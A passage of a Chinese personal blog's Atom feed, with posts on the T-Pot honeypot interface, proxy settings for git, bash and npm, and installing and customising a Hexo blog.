src="/upload_image/2019/07/Snipaste_2019-07-22_16-28-25.png" alt=""></p></li><li><p>Dev Tools界面<br>难度太高, 个人认为是大佬们用的, 这里就跳过了吧…</p></li><li><p>Monitoring界面<br>顾名思义, 就知道这个是用来monitor的, 和DashBoard不一样的是, 这里可以监视5个实用工具的状态和硬件信息<br><img src="/upload_image/2019/07/Snipaste_2019-07-22_16-49-44.png" alt=""></p></li><li><p>Management界面<br>这里就是关于一些设置的东东, 包括了远程主机, 过滤器设置等东西, 用得上的时候再说吧<br><img src="/upload_image/2019/07/Snipaste_2019-07-22_16-52-27.png" alt=""></p></li></ol><h1 id="04-后记"><a href="#04-后记" class="headerlink" title="04 后记"></a>04 后记</h1><p>emmm, 略显简陋的blog, 大概了解就好, 简单了解以后还是很好上手的. Done</p><h1 id="05-后后记"><a href="#05-后后记" class="headerlink" title="05 后后记"></a>05 后后记</h1><p>安装完以后, 可以用 sudo su 命令切换成root,  默认是Debian, 操作命令就不献丑贴出来的, 更改IP啥的操作都是可以进行的</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;某日接到一个任务, 搞定一个蜜罐: &lt;a href=&quot;https://github.com/dtag-dev-sec/tpotce&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;tpot&lt;/a&gt;&lt;br&gt;让我一个菜鸡来干这个, 心虚的很  &lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
      <category term="tpot" scheme="https://zzdkl.com.cn/tags/tpot/"/>
    
      <category term="Honey Pot" scheme="https://zzdkl.com.cn/tags/Honey-Pot/"/>
    
  </entry>
  
  <entry>
    <title>代理类集合(持续更新)</title>
    <link href="https://zzdkl.com.cn/2019/08/18/proxy_in_all/"/>
    <id>https://zzdkl.com.cn/2019/08/18/proxy_in_all/</id>
    <published>2019-08-18T02:21:06.700Z</published>
    <updated>2019-08-17T12:52:59.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>代理的事情是真的烦, 国内的网络环境真是辣鸡, 现在把所有的代理都集合一起, 免得到处找</p><a id="more"></a><h1 id="01-终端代理类"><a href="#01-终端代理类" class="headerlink" title="01 终端代理类"></a>01 终端代理类</h1><p><a href="https://blog.fazero.me/2015/09/15/%E8%AE%A9%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">参考链接: 让终端走代理的几种方法</a></p><p>如何让终端命令比如apt、这些走代理？</p><p>比较好的方法是proxychains，或者export也可以</p><p>export的范围会小一点，但是会更方便</p><p>比如wget、curl，proxychains就很万能了，但是每次都要在前面加语句，略为麻烦，主要针对一些不适用</p><h1 id="02-fish"><a href="#02-fish" class="headerlink" title="02 fish"></a>02 fish</h1><p>在 <code>~/.config/fish/config.fish</code> 中设置，兼容bashrc指令</p><h1 id="03-git"><a href="#03-git" class="headerlink" title="03 git"></a>03 git</h1><p>命令为</p><p><code>git config --global/local http.proxy 'http/socks5://127.0.0.1:1080'</code></p><p><code>git config --global/local https.proxy 'https/socks5://127.0.0.1:1080'</code></p><h1 id="04-shell-bashrc"><a href="#04-shell-bashrc" class="headerlink" title="04 shell/bashrc"></a>04 shell/bashrc</h1><p>命令为</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> setproxysocks5=<span class="string">'export ALL_PROXY=socks5h://127.0.0.1:10808'</span></span><br><span class="line"><span class="built_in">alias</span> unsetproxy=<span class="string">'unset ALL_PROXY'</span></span><br><span class="line"><span class="built_in">alias</span> setproxyhttp=<span class="string">'export ALL_PROXY=http://127.0.0.1:10888'</span>  <span class="comment">##v2ray和curl会有socks5的冲突,从网上找到的参考链接里可以发现，我们加上socks5h就可以了</span></span><br></pre></td></tr></tbody></table></figure><hr><p>对于 socks5 和 socks5h 的区别：</p><p>socks5h: the hostname is resolved by the SOCKS server (also known as CURLPROXY_SOCKS5_HOSTNAME type);<br>socks5: the hostname is resolved locally;</p><p>也就是说socks5适合本地能够解析目标主机域名(比如github.com)但是访问速度慢,来提高下载速度<br>socks5h用与本地不能解析目标主机域名(比如google),由代理服务器解析目标主机域名</p><hr><h1 id="05-npm"><a href="#05-npm" class="headerlink" title="05 npm"></a>05 npm</h1><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="keyword">set</span> proxy <span class="keyword">http</span>://<span class="keyword">server</span>:port</span><br><span class="line">npm config <span class="keyword">set</span> https-proxy <span class="keyword">http</span>://<span class="keyword">server</span>:port</span><br></pre></td></tr></tbody></table></figure><h1 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;代理的事情是真的烦, 国内的网络环境真是辣鸡, 现在把所有的代理都集合一起, 免得到处找&lt;/p&gt;
    
    </summary>
    
      <category term="Network" scheme="https://zzdkl.com.cn/categories/Network/"/>
    
      <category term="Continuously Update" scheme="https://zzdkl.com.cn/categories/Continuously-Update/"/>
    
    
      <category term="Proxy" scheme="https://zzdkl.com.cn/tags/Proxy/"/>
    
      <category term="Continuously Update" scheme="https://zzdkl.com.cn/tags/Continuously-Update/"/>
    
  </entry>
  
  <entry>
    <title>Hexo安装后续2</title>
    <link href="https://zzdkl.com.cn/2019/08/18/hexo_installation_2/"/>
    <id>https://zzdkl.com.cn/2019/08/18/hexo_installation_2/</id>
    <published>2019-08-18T02:21:06.697Z</published>
    <updated>2019-08-29T02:41:37.649Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>继无限折腾后, 终于把博客弄成了自己喜欢的模样, 赞一个!</p><a id="more"></a><h1 id="01-折腾事项"><a href="#01-折腾事项" class="headerlink" title="01 折腾事项"></a>01 折腾事项</h1><p>折腾了许多东东, 不过最着急的是版本太新, 自己找不到地方可以调整的, 只能换成旧版5.x的<br>虽然7.x版本的新特性很多, 也很方便, 但教程始终不多, 还特别多误导, 网上的教程除了抄还是抄<br><strong>拥有阅读官方文档的能力很重要</strong><br>也就是我英语得抓紧学了</p><h1 id="02-优化项目"><a href="#02-优化项目" class="headerlink" title="02 优化项目"></a>02 优化项目</h1><p>bgm, bg picture, copyright, code copy, icp等等, 都加上去了</p><h1 id="03-博客迁移计划"><a href="#03-博客迁移计划" class="headerlink" title="03 博客迁移计划"></a>03 博客迁移计划</h1><p>啊, 心态巨崩, 看我怎么把我的旧博客迁移回来, 包括了图片,<br>最重要的还是要重新整理, 心态巨崩  </p><p>新版博客计划: </p><ul><li>取消掉过多的参考链接, 参考链接均详细描述</li><li>进行详细tag标志, 以及categories分类</li><li>对于未完成的blog进行<code>持续更新</code>tag和categories, 完成后进行删除</li><li>后续新增英文blog计划</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;继无限折腾后, 终于把博客弄成了自己喜欢的模样, 赞一个!&lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
      <category term="hexo" scheme="https://zzdkl.com.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客安装进行时</title>
    <link href="https://zzdkl.com.cn/2019/08/16/hexo_installation/"/>
    <id>https://zzdkl.com.cn/2019/08/16/hexo_installation/</id>
    <published>2019-08-16T04:48:14.318Z</published>
    <updated>2019-08-29T02:41:50.080Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>换博客, 辣鸡wordpress</p><a id="more"></a><h1 id="01-安装"><a href="#01-安装" class="headerlink" title="01 安装"></a>01 安装</h1><p>本机安装<code>git</code>, <code>Node.js</code><br>设置npm代理: </p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="keyword">set</span> proxy <span class="keyword">http</span>://<span class="keyword">server</span>:port</span><br><span class="line">npm config <span class="keyword">set</span> https-proxy <span class="keyword">http</span>://<span class="keyword">server</span>:port</span><br></pre></td></tr></tbody></table></figure><p>然后打开cmd 运行<code>npm install -g hexo</code> 安装hexo<br>新建一个文件夹，如MyBlog<br>进入该文件夹内，右击运行git，输入：hexo init（生成hexo模板, 从GitHub上download下来）   </p><p>生成完模板，运行npm install<br>最后运行：hexo server （运行程序，访问本地localhost:4000可以看到博客已经搭建成功）  </p><h1 id="02-图片"><a href="#02-图片" class="headerlink" title="02 图片"></a>02 图片</h1><p>测试用, 放在<br>source/upload_image<br>使用的时候就/upload_image</p><p><img src="/upload_image/avatar.jpg" alt="2"></p><p><img src="/upload_image/test.jpg" alt="这里"></p><h1 id="03-音乐"><a href="#03-音乐" class="headerlink" title="03 音乐"></a>03 音乐</h1><p><a href="https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html" target="_blank" rel="noopener">参考</a><br>网易云的mp3链接:<br><code>http://music.163.com/song/media/outer/url?id=ID数字.mp3</code><br>通过分享的审查元素可以找到图片<br>最后的<code>\themes\next\source\dist\music.js</code>格式为:</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="attribute">name</span>: <span class="string">""</span>,</span><br><span class="line">  artist: <span class="string">''</span>,</span><br><span class="line">  url: <span class="string">'http://music.163.com/song/media/outer/url?id=.mp3'</span>,</span><br><span class="line">  cover: <span class="string">''</span>,</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="04-美化"><a href="#04-美化" class="headerlink" title="04 美化"></a>04 美化</h1><p>这里美化直接百度吧, 注意版本为NexT6.x以上</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;换博客, 辣鸡wordpress&lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
      <category term="hexo" scheme="https://zzdkl.com.cn/tags/hexo/"/>
    
  </entry>
  
</feed>
